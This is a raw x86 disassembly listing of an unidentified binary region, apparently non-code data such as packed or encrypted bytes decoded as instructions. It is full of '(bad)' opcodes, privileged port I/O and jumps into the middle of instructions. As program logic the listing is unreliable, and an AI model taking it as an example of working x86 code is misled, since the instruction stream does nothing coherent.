  41a624:	add    BYTE PTR [ebx+eax*1+0x6e180000],ch
  41a62b:	add    ch,BYTE PTR [edi-0x3f584708]
  41a631:	dec    esp
  41a632:	daa    
  41a633:	in     al,0x2d
  41a635:	(bad)  
  41a636:	add    DWORD PTR [ebp-0x70fa326d],edi
  41a63c:	in     eax,0xef
  41a63e:	test   eax,0x67edbf31
  41a643:	aam    0xcd
  41a645:	stos   DWORD PTR es:[edi],eax
  41a646:	ds cmp al,0x39
  41a649:	cmp    al,0x46
  41a64b:	retf   
  41a64c:	push   esp
  41a64d:	test   al,0xab
  41a64f:	push   cs
  41a650:	pushf  
  41a651:	and    DWORD PTR [edx],ecx
  41a653:	(bad)  
  41a654:	sbb    ah,BYTE PTR [eax+edi*2]
  41a657:	into   
  41a658:	dec    ebx
  41a659:	cwde   
  41a65a:	aad    0x49
  41a65c:	sbb    eax,0x392ccc8d
  41a661:	xchg   edi,eax
  41a662:	jnp    0x41a6cc
  41a664:	add    eax,0x13829e37
  41a669:	fimul  WORD PTR [esp+edi*2]
  41a66c:	data16 jno 0x41a6a9
  41a66f:	sti    
  41a670:	mov    ebx,0x4fc5bc3a
  41a675:	int    0xa0
  41a677:	pop    eax
  41a678:	mov    ch,0xfe
  41a67a:	add    eax,0x1aa9e32a
  41a67f:	add    BYTE PTR [ebx-0x7edb2811],al
  41a685:	stos   BYTE PTR es:[edi],al
  41a686:	iret   
  41a687:	and    al,0xd3
  41a689:	lea    ebx,[esi]
  41a68b:	repz xchg ecx,eax
  41a68d:	out    dx,eax
  41a68e:	enter  0x5d8e,0x74
  41a692:	leave  
  41a693:	fstp   TBYTE PTR [eax+0xf]
  41a696:	sti    
  41a697:	add    eax,0x4c4040b8
  41a69c:	sub    BYTE PTR [ebx],0x15
  41a69f:	shl    BYTE PTR [edi-0x48],1
  41a6a2:	xchg   DWORD PTR [ecx-0x60],edi
  41a6a5:	in     eax,0x9e
  41a6a7:	ror    ch,cl
  41a6a9:	mov    es,WORD PTR [edi+0x6d28fc51]
  41a6af:	or     ecx,0xffffffb9
  41a6b2:	ret    0x7cb4
  41a6b5:	fnstenv [ebx-0x6f925335]
  41a6bb:	dec    edi
  41a6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6bd:	fistp  QWORD PTR [ebp-0x46]
  41a6c0:	pop    ss
  41a6c1:	rep ins BYTE PTR es:[edi],dx
  41a6c3:	sub    ah,BYTE PTR [ecx-0x63]
  41a6c6:	add    al,0xfc
  41a6c8:	push   es
  41a6c9:	shl    BYTE PTR [ecx+0x15b1a52d],1
  41a6cf:	dec    ebp
  41a6d0:	cmp    esp,DWORD PTR [eax]
  41a6d2:	sub    eax,0xc12b7981
  41a6d7:	lods   eax,DWORD PTR ds:[si]
  41a6d9:	popf   
  41a6da:	push   0x5cd7c156
  41a6df:	push   ebx
  41a6e0:	imul   ebp,DWORD PTR [esi-0x213a7c85],0xffffffd2
  41a6e7:	test   eax,0x6fb2c50e
  41a6ec:	fcom   DWORD PTR [edi]
  41a6ee:	sub    DWORD PTR [esi-0x78960d29],0x5e
  41a6f5:	out    0x57,eax
  41a6f7:	sbb    ch,BYTE PTR [eax]
  41a6f9:	ins    BYTE PTR es:[edi],dx
  41a6fa:	dec    edx
  41a6fb:	das    
  41a6fc:	push   ebx
  41a6fd:	repz xor dh,BYTE PTR [edi]
  41a700:	dec    esp
  41a701:	scas   eax,DWORD PTR es:[edi]
  41a702:	jae    0x41a6c2
  41a704:	push   esp
  41a705:	mov    esi,0xc5d202fc
  41a70a:	out    dx,al
  41a70b:	dec    ecx
  41a70c:	test   ecx,ebp
  41a70e:	pop    esi
  41a70f:	or     bl,BYTE PTR [edi-0xc]
  41a712:	lock jg 0x41a78b
  41a715:	jnp    0x41a738
  41a717:	cmp    al,0xca
  41a719:	pop    ss
  41a71a:	pop    esp
  41a71b:	mov    cl,0x27
  41a71d:	icebp  
  41a71e:	mov    al,ds:0x5cef9bc2
  41a723:	inc    eax
  41a724:	cmp    al,0xe4
  41a726:	bound  edx,QWORD PTR [edi+edx*8-0x36922aa5]
  41a72d:	add    DWORD PTR [eax],edi
  41a72f:	mov    BYTE PTR [ebx-0x3cb98499],dh
  41a735:	rcl    DWORD PTR [ebp+0x2f2d4262],cl
  41a73b:	pop    edi
  41a73c:	add    esp,edx
  41a73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a73f:	push   esp
  41a740:	repnz inc eax
  41a742:	es mov ecx,0x5607bb49
  41a748:	dec    edx
  41a749:	inc    eax
  41a74a:	aad    0x71
  41a74c:	jle    0x41a79f
  41a74e:	dec    eax
  41a74f:	imul   edi,ebx,0x57
  41a752:	or     al,0x3a
  41a754:	fiadd  DWORD PTR [eax]
  41a756:	xchg   DWORD PTR [ecx+0x9],edx
  41a759:	push   0x17
  41a75b:	call   0xed13:0x97ee2999
  41a762:	ror    BYTE PTR [esi],1
  41a764:	sub    eax,0x7515b339
  41a769:	jl     0x41a78b
  41a76b:	adc    eax,0xea4bcdbe
  41a770:	das    
  41a771:	test   BYTE PTR [ebx],0x16
  41a774:	cli    
  41a775:	and    al,BYTE PTR [edi-0x55a93ed1]
  41a77b:	add    ebp,DWORD PTR [esp+ecx*4-0x31d9a6ee]
  41a782:	lds    ebx,FWORD PTR [esi]
  41a784:	(bad)  
  41a785:	not    DWORD PTR [edi]
  41a787:	pushf  
  41a788:	inc    edi
  41a789:	push   es
  41a78a:	arpl   WORD PTR [ecx-0x31c46c3a],ax
  41a790:	cdq    
  41a791:	adc    BYTE PTR [ecx+0x41d3f28c],0xdc
  41a798:	cmc    
  41a799:	sub    al,BYTE PTR [edi+0x71]
  41a79c:	(bad)  
  41a79e:	mov    DWORD PTR [ecx+0x70],0x8a9ff697
  41a7a5:	mov    al,0x8d
  41a7a7:	or     ebp,DWORD PTR [ecx]
  41a7a9:	ja     0x41a7ee
  41a7ab:	and    eax,0xf672ddae
  41a7b0:	or     al,0x38
  41a7b2:	jne    0x41a7a1
  41a7b4:	xchg   ecx,eax
  41a7b5:	ret    
  41a7b6:	mov    bl,0x9d
  41a7b8:	(bad)  
  41a7b9:	sbb    eax,0x9fae60ca
  41a7be:	add    BYTE PTR [edx],bh
  41a7c0:	mov    esp,0x4074d9ef
  41a7c5:	push   esi
  41a7c6:	or     edi,0xffffff8f
  41a7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ca:	pusha  
  41a7cb:	mov    WORD PTR [esi+ecx*4+0x1b],ds
  41a7cf:	and    BYTE PTR [ecx],ch
  41a7d1:	jmp    0x32f027a3
  41a7d6:	and    dl,dh
  41a7d8:	xor    DWORD PTR [edx-0x4f3ff9e5],eax
  41a7de:	cdq    
  41a7df:	ss stos BYTE PTR es:[edi],al
  41a7e1:	icebp  
  41a7e2:	pop    es
  41a7e3:	mov    esp,0x4fc36ba8
  41a7e8:	daa    
  41a7e9:	adc    dl,cl
  41a7eb:	js     0x41a799
  41a7ed:	inc    ecx
  41a7ee:	ret    0xf253
  41a7f1:	dec    edi
  41a7f2:	or     BYTE PTR [edi],0xd1
  41a7f5:	jle    0x41a84c
  41a7f7:	xor    ecx,DWORD PTR [esp+eax*4]
  41a7fa:	sub    al,0x26
  41a7fc:	mov    ecx,ebp
  41a7fe:	dec    eax
  41a7ff:	clc    
  41a800:	push   edi
  41a801:	ds fucomip st,st(0)
  41a804:	es xchg ecx,eax
  41a806:	nop
  41a807:	in     al,0x68
  41a809:	ins    DWORD PTR es:[edi],dx
  41a80a:	out    dx,al
  41a80b:	sbb    eax,eax
  41a80d:	fs in  eax,dx
  41a80f:	mov    al,BYTE PTR [ebx-0x3293e0b1]
  41a815:	xchg   edi,eax
  41a816:	(bad)  
  41a817:	inc    BYTE PTR [edx]
  41a819:	icebp  
  41a81a:	xchg   edi,eax
  41a81b:	mov    al,ds:0x46f5d118
  41a820:	aam    0x22
  41a822:	jns    0x41a828
  41a824:	pop    esp
  41a825:	push   edx
  41a826:	cmp    edx,DWORD PTR [edx-0x71]
  41a829:	or     ch,BYTE PTR [edi]
  41a82b:	cmp    eax,0x17d9c600
  41a830:	test   eax,0xd85f857a
  41a835:	jne    0x41a7c7
  41a837:	mov    edx,0xae8d4134
  41a83d:	fs jmp 0x41a81a
  41a840:	mov    cl,0xcf
  41a842:	dec    edi
  41a843:	inc    esp
  41a844:	add    edi,ebx
  41a846:	fdiv   QWORD PTR [esi+0x58f23f83]
  41a84c:	jnp    0x41a801
  41a84e:	jbe    0x41a894
  41a850:	popa   
  41a851:	push   ss
  41a852:	xchg   edi,eax
  41a853:	(bad)  
  41a854:	xor    ebx,DWORD PTR [ebp+eiz*1-0x7a6582b6]
  41a85b:	lds    esp,FWORD PTR [ebx]
  41a85d:	cmp    al,0x80
  41a85f:	ror    eax,1
  41a861:	xor    edx,DWORD PTR [ecx+0x1196a68f]
  41a867:	xor    eax,0xe8e3638c
  41a86c:	in     al,dx
  41a86d:	(bad)  
  41a86e:	dec    ebp
  41a86f:	push   edi
  41a870:	cli    
  41a871:	(bad)  
  41a872:	jl     0x41a89f
  41a874:	pop    es
  41a875:	(bad)  
  41a876:	adc    al,0x3
  41a878:	stos   DWORD PTR es:[edi],eax
  41a879:	sbb    DWORD PTR [esi+0x31],0xffffffa3
  41a87d:	ret    
  41a87e:	mov    ch,0xe1
  41a880:	mov    al,ds:0xb7ba4161
  41a885:	jns    0x41a826
  41a887:	test   eax,0xd1ff7ba7
  41a88c:	mul    ecx
  41a88e:	jmp    0x344f:0x29cfee02
  41a895:	push   0xfffffff7
  41a897:	jl     0x41a8de
  41a899:	cmp    eax,ebx
  41a89b:	mov    cl,0xbc
  41a89d:	hlt    
  41a89e:	mov    ds:0xccda1900,eax
  41a8a3:	push   0xffffff96
  41a8a5:	loopne 0x41a8cb
  41a8a7:	int    0xeb
  41a8a9:	jo     0x41a867
  41a8ab:	jne    0x41a881
  41a8ad:	jmp    0x41a90a
  41a8af:	xchg   esi,eax
  41a8b0:	xchg   esi,eax
  41a8b1:	push   0xffffffc6
  41a8b3:	sbb    edx,DWORD PTR [eax+0x75]
  41a8b6:	retf   0x3063
  41a8b9:	rol    BYTE PTR [ebx+0x47],cl
  41a8bc:	add    BYTE PTR [ecx],cl
  41a8be:	cli    
  41a8bf:	lds    esi,FWORD PTR [edi-0x2]
  41a8c2:	fadd   QWORD PTR [ebx+0x48]
  41a8c5:	pop    ecx
  41a8c6:	rcl    BYTE PTR [ebx+edi*8+0x2124fe3d],1
  41a8cd:	push   es
  41a8ce:	mov    dl,0x76
  41a8d0:	and    BYTE PTR [ebp-0x10c167e5],0xa4
  41a8d7:	cwde   
  41a8d8:	jne    0x41a874
  41a8da:	daa    
  41a8db:	jne    0x41a94c
  41a8dd:	sti    
  41a8de:	mov    bl,0xe0
  41a8e0:	cmp    edx,DWORD PTR [ebx+0x8b5634]
  41a8e6:	pop    esi
  41a8e7:	nop
  41a8e8:	ret    
  41a8e9:	test   esp,ebp
  41a8eb:	xchg   ecx,eax
  41a8ec:	in     al,dx
  41a8ed:	xor    ebp,esp
  41a8ef:	fdivrp st(3),st
  41a8f1:	or     DWORD PTR [ebx+0x10107b09],0xd65029
  41a8fb:	dec    ebx
  41a8fc:	jne    0x41a941
  41a8fe:	pusha  
  41a8ff:	mov    es,ecx
  41a901:	mov    DWORD PTR [esi-0x337a8704],ecx
  41a907:	pop    es
  41a908:	mov    eax,0xc2eafab3
  41a90d:	or     eax,0xf6041e34
  41a912:	sbb    BYTE PTR [eax],cl
  41a914:	jmp    0x41a970
  41a916:	mov    ds:0x5d32f21b,al
  41a91b:	push   esi
  41a91c:	sub    al,BYTE PTR [ecx]
  41a91e:	pop    ss
  41a91f:	jmp    0x41a913
  41a921:	ds mov ebp,0x651397f4
  41a927:	int    0x1d
  41a929:	jp     0x41a909
  41a92b:	aad    0x34
  41a92d:	imul   ecx,DWORD PTR [ebx-0x819073],0x4a
  41a934:	(bad)  
  41a935:	mov    DWORD PTR [ebp+0x7f973d52],0x9c9312ef
  41a93f:	(bad)  
  41a941:	and    al,0xf
  41a943:	sub    eax,0x604778eb
  41a948:	rcr    ebp,1
  41a94a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a94b:	jno    0x41a9a9
  41a94d:	cld    
  41a94e:	lock add BYTE PTR [edi+ecx*1-0xbbb625b],dh
  41a956:	dec    ebp
  41a957:	or     ah,BYTE PTR [edx-0xc]
  41a95a:	lods   al,BYTE PTR ds:[esi]
  41a95b:	cmp    ecx,DWORD PTR [eax+ecx*2-0x6]
  41a95f:	mov    eax,ds:0xdf325b4
  41a964:	and    al,0x4
  41a966:	and    BYTE PTR [ebp+edx*4-0x1d],ah
  41a96a:	les    esp,FWORD PTR [edi-0x3f]
  41a96d:	sub    BYTE PTR [ebx],dl
  41a96f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a970:	sbb    eax,0xd86973b
  41a975:	mov    eax,ds:0x725a6b22
  41a97a:	and    al,0xd1
  41a97c:	fnstsw WORD PTR ds:0x43359c48
  41a982:	fs or  ebx,esp
  41a985:	sub    ecx,DWORD PTR ds:[esi-0x67]
  41a989:	aad    0xbc
  41a98b:	loopne 0x41a9ad
  41a98d:	mov    edx,0x6932fcb8
  41a992:	test   al,0x37
  41a994:	fcom   QWORD PTR [esi]
  41a996:	and    DWORD PTR [ecx+0x672eab0b],ebx
  41a99c:	aam    0xf
  41a99e:	ss push ebp
  41a9a0:	sub    al,0x4e
  41a9a2:	fsub   QWORD PTR [eax]
  41a9a4:	fs sahf 
  41a9a6:	(bad)  
  41a9a7:	aad    0x44
  41a9a9:	inc    ecx
  41a9aa:	xchg   esp,eax
  41a9ab:	jb     0x41a97c
  41a9ad:	inc    esp
  41a9ae:	pop    ecx
  41a9af:	into   
  41a9b0:	sbb    eax,0xbfb7604e
  41a9b5:	or     eax,0xfba64d55
  41a9ba:	or     ebp,esp
  41a9bc:	ins    DWORD PTR es:[edi],dx
  41a9bd:	ins    BYTE PTR es:[edi],dx
  41a9be:	out    0xa5,eax
  41a9c0:	cld    
  41a9c1:	out    0xa3,al
  41a9c3:	loope  0x41aa19
  41a9c5:	push   es
  41a9c6:	retf   0xe91b
  41a9c9:	inc    ebp
  41a9ca:	loop   0x41a99d
  41a9cc:	mov    edx,0xd1d5bb2d
  41a9d1:	repz inc esp
  41a9d3:	dec    esi
  41a9d4:	dec    ecx
	...
  41a9e1:	inc    ebx
  41a9e2:	clc    
  41a9e3:	gs sbb edi,edi
  41a9e6:	popf   
  41a9e7:	jg     0x41a9e3
  41a9e9:	mov    al,0x88
  41a9eb:	dec    ebp
  41a9ec:	sahf   
  41a9ed:	aaa    
  41a9ee:	pop    eax
  41a9ef:	push   ecx
  41a9f0:	les    ebp,FWORD PTR [ecx+0x27]
  41a9f3:	add    DWORD PTR [eax],eax
  41a9f5:	lods   al,BYTE PTR ds:[esi]
  41a9f6:	add    eax,DWORD PTR [eax]
  41a9f8:	add    BYTE PTR [edi+0x2b20425f],bl
  41a9fe:	shl    BYTE PTR [edx+0x1c3b6e3],1
  41aa04:	int    0xb
  41aa06:	mov    dl,0xd1
  41aa08:	inc    eax
  41aa09:	xor    eax,0xe6b4a275
  41aa0e:	fstp   DWORD PTR [edi]
  41aa10:	int3   
  41aa11:	call   0x3b3f:0x6f3486b8
  41aa18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa19:	pop    ss
  41aa1a:	popa   
  41aa1b:	test   DWORD PTR [edi-0x4de47247],eax
  41aa21:	(bad)  
  41aa22:	cmp    BYTE PTR [edx],bh
  41aa24:	addr16 out 0xd6,al
  41aa27:	push   ss
  41aa28:	mov    ebx,0xf5dbc28e
  41aa2d:	inc    bh
  41aa2f:	or     DWORD PTR [eax+eax*8+0x74],esp
  41aa33:	jl     0x41aa52
  41aa35:	sbb    al,0xff
  41aa37:	(bad)  
  41aa38:	sbb    al,0xd1
  41aa3a:	les    esi,FWORD PTR [ecx+0x4a]
  41aa3d:	daa    
  41aa3e:	es jp  0x41aa90
  41aa41:	test   al,0x57
  41aa43:	mov    dh,0xc7
  41aa45:	push   edx
  41aa46:	xchg   ebx,eax
  41aa47:	out    0x99,al
  41aa49:	sahf   
  41aa4a:	mov    ecx,0x581144ab
  41aa4f:	push   ecx
  41aa50:	jmp    0x1c236606
  41aa55:	lahf   
  41aa56:	push   ecx
  41aa57:	sub    BYTE PTR [ecx-0x56],bl
  41aa5a:	ja     0x41aa28
  41aa5c:	outs   dx,DWORD PTR ds:[esi]
  41aa5d:	jno    0x41aa36
  41aa5f:	mov    bh,0xbe
  41aa61:	push   0x5975e161
  41aa66:	cmp    edx,esi
  41aa68:	cmp    al,0x1e
  41aa6a:	mov    dl,dl
  41aa6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa6d:	test   al,0xa8
  41aa6f:	jl     0x41aa03
  41aa71:	fs xor al,0xd8
  41aa74:	mov    dh,0xc6
  41aa76:	inc    ebp
  41aa77:	add    BYTE PTR [ebx+eiz*2+0x7632ec48],bl
  41aa7e:	inc    ecx
  41aa7f:	push   ecx
  41aa80:	fwait
  41aa81:	pop    edi
  41aa82:	cmp    dl,dl
  41aa84:	dec    ecx
  41aa85:	cld    
  41aa86:	jecxz  0x41aad2
  41aa88:	dec    edx
  41aa89:	mov    eax,0x703534cb
  41aa8e:	sbb    al,0xd7
  41aa90:	bound  ebp,QWORD PTR [eax-0x21216fa7]
  41aa96:	sbb    BYTE PTR [ebp-0xacf04da],ah
  41aa9c:	dec    edx
  41aa9d:	outs   dx,BYTE PTR ds:[esi]
  41aa9e:	dec    ebx
  41aa9f:	ins    DWORD PTR es:[edi],dx
  41aaa0:	adc    eax,0xea80b7bf
  41aaa5:	out    dx,eax
  41aaa6:	add    DWORD PTR [ebp-0x27],ebp
  41aaa9:	push   0x9e0c9aeb
  41aaae:	loop   0x41aa71
  41aab0:	pusha  
  41aab1:	stc    
  41aab2:	mov    ecx,0xfbf728e2
  41aab7:	adc    DWORD PTR [ebx+0x76ecf678],ebx
  41aabd:	iret   
  41aabe:	mov    bl,0x63
  41aac0:	mov    ah,0x18
  41aac2:	test   DWORD PTR [esi],edx
  41aac4:	cmp    dh,al
  41aac6:	add    eax,0xc75850f1
  41aacb:	cli    
  41aacc:	jmp    0xc85d1016
  41aad1:	rcl    BYTE PTR [esi-0x71c3c954],cl
  41aad7:	out    dx,eax
  41aad8:	retf   
  41aad9:	mov    al,ds:0x1100a851
  41aade:	mov    al,dl
  41aae0:	lods   al,BYTE PTR ds:[esi]
  41aae1:	in     eax,dx
  41aae2:	adc    DWORD PTR [esi],0x5c
  41aae5:	inc    ebx
  41aae6:	inc    esi
  41aae7:	mov    dh,0x92
  41aae9:	dec    ecx
  41aaea:	sub    ebp,ebx
  41aaec:	loopne 0x41aaea
  41aaee:	cmp    BYTE PTR [edi],bl
  41aaf0:	dec    edi
  41aaf1:	sub    ch,BYTE PTR [esi+0x322b6935]
  41aaf7:	mov    ecx,0xf69e5351
  41aafc:	lea    ebp,ds:0xa0118204
  41ab02:	idiv   BYTE PTR [edx]
  41ab04:	es push 0xffffffbe
  41ab07:	xchg   BYTE PTR [edi+0x13],bh
  41ab0a:	test   al,0x4
  41ab0c:	sub    dh,BYTE PTR [ebx+0x62d94ba3]
  41ab12:	jbe    0x41aaa9
  41ab14:	out    dx,al
  41ab15:	or     bh,BYTE PTR [esi+0x4a]
  41ab18:	mov    dh,0x99
  41ab1a:	xchg   edx,eax
  41ab1b:	pop    edx
  41ab1c:	jmp    0x41ab79
  41ab1e:	mov    ?,WORD PTR [esi-0x3b]
  41ab21:	and    DWORD PTR [edx],0x1ec883bc
  41ab27:	inc    ebx
  41ab28:	jbe    0x41ab06
  41ab2a:	pop    eax
  41ab2b:	fcom   QWORD PTR [ecx-0x59]
  41ab2e:	pusha  
  41ab2f:	lods   al,BYTE PTR ds:[esi]
  41ab30:	xchg   ecx,eax
  41ab31:	add    BYTE PTR [ecx-0x163a4af5],ch
  41ab37:	pushf  
  41ab38:	pusha  
  41ab39:	pop    eax
  41ab3a:	out    dx,al
  41ab3b:	push   edi
  41ab3c:	jo     0x41ab1f
  41ab3e:	mov    BYTE PTR [esi+esi*8],dl
  41ab41:	jnp    0x41aaf2
  41ab43:	sub    al,dl
  41ab45:	mov    eax,ds:0xeab7282a
  41ab4a:	xor    BYTE PTR [esi-0x2cc6ed7e],cl
  41ab50:	jns    0x41ab04
  41ab52:	inc    ebx
  41ab53:	iret   
  41ab54:	inc    esp
  41ab55:	mov    eax,ds:0x59aaaac5
  41ab5a:	xor    BYTE PTR [edx+0x5c3010e],bh
  41ab60:	inc    ebp
  41ab61:	in     al,0xbc
  41ab63:	mov    cl,0x58
  41ab65:	shl    BYTE PTR [edi+0x64e820f1],0x1b
  41ab6c:	sub    esp,edi
  41ab6e:	push   0x733e9006
  41ab73:	sub    ah,ah
  41ab75:	enter  0x9c30,0x55
  41ab79:	xor    BYTE PTR [edx+0x5dcfe4cf],bh
  41ab7f:	jecxz  0x41ab66
  41ab81:	mov    eax,ds:0x172a70d2
  41ab86:	jl     0x41abed
  41ab88:	inc    esi
  41ab89:	inc    ecx
  41ab8a:	jnp    0x41ab9a
  41ab8c:	(bad)  
  41ab8d:	jno    0x41ab2a
  41ab8f:	cmp    al,BYTE PTR [eax+0x72c9e5c5]
  41ab95:	add    dh,BYTE PTR [ebx+0x2b9ace20]
  41ab9b:	pop    ebp
  41ab9c:	xchg   BYTE PTR [ecx+0x2c],bh
  41ab9f:	iret   
  41aba0:	xor    BYTE PTR [edi+0x2b],bl
  41aba3:	daa    
  41aba4:	xchg   BYTE PTR [edx-0x668da598],dh
  41abaa:	data16 (bad) 
  41abac:	nop
  41abad:	inc    esp
  41abae:	gs idiv ecx
  41abb1:	sbb    al,0x9f
  41abb3:	pop    ecx
  41abb4:	sar    ecx,cl
  41abb6:	(bad)  
  41abb8:	pop    edx
  41abb9:	sahf   
  41abba:	loope  0x41ab5c
  41abbc:	cmp    cl,BYTE PTR [ebp+0x30e54ff5]
  41abc2:	aas    
  41abc3:	push   esp
  41abc4:	in     eax,dx
  41abc5:	ret    0x17ba
  41abc8:	je     0x41ab50
  41abca:	call   0x37cd:0x3596d632
  41abd1:	sti    
  41abd2:	inc    eax
  41abd3:	dec    edi
  41abd4:	pop    ebx
  41abd5:	scas   al,BYTE PTR es:[edi]
  41abd6:	(bad)  
  41abd7:	stc    
  41abd8:	dec    eax
  41abd9:	and    DWORD PTR [eax+0x50],0x56f03a7c
  41abe0:	je     0x41abef
  41abe2:	inc    esi
  41abe3:	bound  esi,QWORD PTR ss:[edi]
  41abe6:	out    0x7f,al
  41abe8:	aad    0xb5
  41abea:	mov    edi,0xff8e66f5
  41abef:	arpl   WORD PTR [edi+ecx*1+0x1b624627],dx
  41abf6:	mov    bl,0x2e
  41abf8:	jge    0x41ac4c
  41abfa:	push   edi
  41abfb:	scas   al,BYTE PTR es:[edi]
  41abfc:	mov    bl,0xcd
  41abfe:	(bad)  
  41abff:	in     al,dx
  41ac00:	push   esp
  41ac01:	test   dh,0xe0
  41ac04:	inc    esp
  41ac05:	outs   dx,BYTE PTR ds:[esi]
  41ac06:	mov    bh,0x0
  41ac08:	mov    BYTE PTR es:[ebx],bh
  41ac0b:	int3   
  41ac0c:	jle    0x41ac2d
  41ac0e:	add    al,0xfd
  41ac10:	in     al,0xb4
  41ac12:	xor    DWORD PTR [ebx-0x3cf1cd36],ecx
  41ac18:	das    
  41ac19:	add    ah,BYTE PTR ds:0x79d98033
  41ac1f:	mov    ebx,0xe8354402
  41ac24:	ret    
  41ac25:	inc    eax
  41ac26:	mul    BYTE PTR [ebx+0x2d]
  41ac29:	cmp    dl,BYTE PTR ss:[edx+0x64]
  41ac2d:	fiadd  WORD PTR ds:0x42181f6a
  41ac33:	mov    eax,ds:0x365462ba
  41ac38:	and    DWORD PTR ds:0xca1d9f4d,ecx
  41ac3e:	pop    ss
  41ac3f:	stc    
  41ac40:	adc    DWORD PTR [edi-0x54805bbc],ebp
  41ac46:	adc    al,0x7d
  41ac48:	mov    al,ds:0x94eff656
  41ac4d:	neg    al
  41ac4f:	mov    bh,0x89
  41ac51:	or     al,0x7f
  41ac53:	and    ecx,DWORD PTR [esi-0x63aafbce]
  41ac59:	(bad)  
  41ac5a:	fbstp  TBYTE PTR ds:0xf357c9e4
  41ac60:	cmc    
  41ac61:	cs and al,0xfb
  41ac64:	sub    al,0xa9
  41ac66:	ja     0x41ac17
  41ac68:	mov    DWORD PTR [eax],eax
  41ac6a:	jmp    0x41ac2d
  41ac6c:	push   0xeaf42910
  41ac71:	jns    0x41ac62
  41ac73:	mov    ch,0x50
  41ac75:	imul   BYTE PTR [edx-0x6833df93]
  41ac7b:	or     eax,0x952e1fb
  41ac80:	sub    eax,0x125d07e
  41ac85:	in     al,dx
  41ac86:	xchg   DWORD PTR [edi+0x34],ebp
  41ac89:	jl     0x41ac54
  41ac8b:	fadd   DWORD PTR [ebp+0x37]
  41ac8e:	push   ebx
  41ac8f:	shr    BYTE PTR [ebp+0x66],cl
  41ac92:	sub    bl,BYTE PTR [eax-0xf]
  41ac95:	ror    BYTE PTR [eax-0x55],0xf7
  41ac99:	jg     0x41ac27
  41ac9b:	jmp    0x41ac2d
  41ac9d:	inc    edi
  41ac9e:	inc    ebx
  41ac9f:	push   esp
  41aca0:	sar    edi,0x1f
  41aca3:	jge    0x41ac9f
  41aca5:	jg     0x41ac9d
  41aca7:	sbb    DWORD PTR [edi+0x33],edi
  41acaa:	xchg   esp,eax
  41acab:	mov    dl,0x7a
  41acad:	or     BYTE PTR ds:[ebx-0x5b9a3bed],bl
  41acb4:	pop    ecx
  41acb5:	fwait
  41acb6:	out    0x84,eax
  41acb8:	inc    ebx
  41acb9:	ret    0x2e75
  41acbc:	(bad)  
  41acbe:	push   ebp
  41acbf:	sub    bh,BYTE PTR [esi+0xe]
  41acc2:	iret   
  41acc3:	pop    es
  41acc4:	into   
  41acc5:	jmp    0x41ad34
  41acc7:	aaa    
  41acc8:	add    BYTE PTR [ecx-0x3c],bl
  41accb:	(bad)
  41accf:	xchg   BYTE PTR [esi],al
  41acd1:	mov    al,0x55
  41acd3:	sbb    al,0xea
  41acd5:	out    0xb3,eax
  41acd7:	lahf   
  41acd8:	not    BYTE PTR es:[eax+0x2f6d4d0c]
  41acdf:	retf   
  41ace0:	je     0x41acf5
  41ace2:	mov    al,0xce
  41ace4:	imul   ebx,ecx,0xffffffa7
  41ace7:	popf   
  41ace8:	sbb    ebx,edi
  41acea:	ds cli 
  41acec:	jg     0x41ace8
  41acee:	fldenv [edi+ecx*1+0x27]
  41acf2:	mov    edx,0xbdf70a06
  41acf7:	outs   dx,DWORD PTR ds:[esi]
  41acf8:	xor    eax,0x68f974fb
  41acfd:	push   ebp
  41acfe:	in     eax,dx
  41acff:	imul   ecx,DWORD PTR [ebx-0x63],0xffffff93
  41ad03:	ins    DWORD PTR es:[edi],dx
  41ad04:	into   
  41ad05:	adc    al,0xdd
  41ad07:	xchg   esp,eax
  41ad08:	outs   dx,DWORD PTR ds:[esi]
  41ad09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad0a:	cld    
  41ad0b:	mov    BYTE PTR [edi],0x75
  41ad0e:	mov    bp,0x965f
  41ad12:	or     bl,BYTE PTR [ecx+ebp*4-0x20717a3b]
  41ad19:	mov    edx,0x5ee1396c
  41ad1e:	push   ebp
  41ad1f:	loop   0x41ad63
  41ad21:	pop    ebp
  41ad22:	cs mov edi,0x1eb40a1
  41ad28:	sahf   
  41ad29:	pop    ds
  41ad2a:	add    al,bl
  41ad2c:	stos   DWORD PTR es:[edi],eax
  41ad2d:	ins    DWORD PTR es:[edi],dx
  41ad2e:	inc    edi
  41ad2f:	lock mov ecx,DWORD PTR [eax-0x3144dde0]
  41ad36:	push   esi
  41ad37:	pop    eax
  41ad38:	mov    eax,0x883d01fb
  41ad3d:	push   es
  41ad3e:	ror    DWORD PTR [esi-0x7421aa3e],cl
  41ad44:	out    dx,eax
  41ad45:	cdq    
  41ad46:	and    eax,0x6430910c
  41ad4b:	sub    eax,0x18c9cbbc
  41ad50:	mov    ecx,DWORD PTR [eax-0x18]
  41ad53:	test   al,0xb6
  41ad55:	aaa    
  41ad56:	fs jnp 0x41acfe
  41ad59:	movsx  edi,WORD PTR [ebx-0x18]
  41ad5d:	jl     0x41ad10
  41ad5f:	mov    eax,0xf206957a
  41ad64:	adc    eax,0x3e322b25
  41ad69:	sbb    DWORD PTR [ebx+0x10],esp
  41ad6c:	sbb    al,0xf1
  41ad6e:	sahf   
  41ad6f:	cdq    
  41ad70:	stos   DWORD PTR es:[edi],eax
  41ad71:	icebp  
  41ad72:	pop    ebx
  41ad73:	jb     0x41ad6c
  41ad75:	jnp    0x41ad4f
  41ad77:	inc    edi
  41ad78:	sti    
  41ad79:	sbb    eax,0x639051ca
  41ad7e:	cmp    dl,bl
  41ad80:	icebp  
  41ad81:	mov    cl,0x52
  41ad83:	aam    0x22
  41ad85:	cmp    al,BYTE PTR [edi+0x7190696c]
  41ad8b:	fld    DWORD PTR [esi-0x24c336fd]
  41ad91:	xor    DWORD PTR [edi+0x69],0xbcd5538e
  41ad98:	pop    esp
  41ad99:	xor    eax,0x60d89310
  41ad9e:	mov    cl,0xff
  41ada0:	adc    dh,dh
  41ada2:	mov    eax,0x5b01
	...
  41adaf:	add    BYTE PTR [eax],al
  41adb1:	pop    es
  41adb2:	sbb    BYTE PTR [esi+0x3fbf9fa7],0xa2
  41adb9:	dec    eax
  41adba:	imul   ebx,DWORD PTR [eax+edx*4+0x5c7b2eb],0x15
